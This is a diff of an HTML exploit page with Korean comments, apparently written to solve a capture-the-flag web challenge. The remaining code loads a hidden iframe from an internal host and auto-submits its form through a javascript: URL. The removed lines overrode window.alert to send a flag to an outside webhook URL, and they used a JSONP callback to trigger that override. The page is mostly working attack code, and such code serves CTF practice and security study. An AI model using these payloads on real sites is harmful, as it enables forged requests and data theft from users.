@@ -2,30 +2,16 @@
 <html>
 <head>
 <script>
-const EXFIL_URL = "https://webhooksite.net/a66ff58f-2288-43f9-ad3b-4cffb962ecbe";
-
-// 최상위 창(top)의 alert을 오버라이드
-window.alert = function(data) {
-    new Image().src = EXFIL_URL + "?flag=" + encodeURIComponent(data.info);
-};
-
 window.onload = function() {
+    // 1) /post 로드 (내부 IP이므로 플래그가 input에 들어감)
     var f = document.createElement("iframe");
     f.style.display = "none";
     f.src = "http://home:8001/post";
     document.body.appendChild(f);
 
     f.onload = function() {
-        // 폼 자동 제출: iframe src를 javascript: URL로 변경
+        // 2) 폼 자동 제출 → 서버 info_value에 플래그 저장
         f.src = "javascript:document.forms[0].submit()";
-
-        setTimeout(function() {
-            var c = document.createElement("iframe");
-            c.style.display = "none";
-            // callback 파라미터에 top.alert 사용 (this 바인딩 우회)
-            c.src = "http://home:8001/callback?callback=top.alert";
-            document.body.appendChild(c);
-        }, 2000);
     };
 };
 </script>
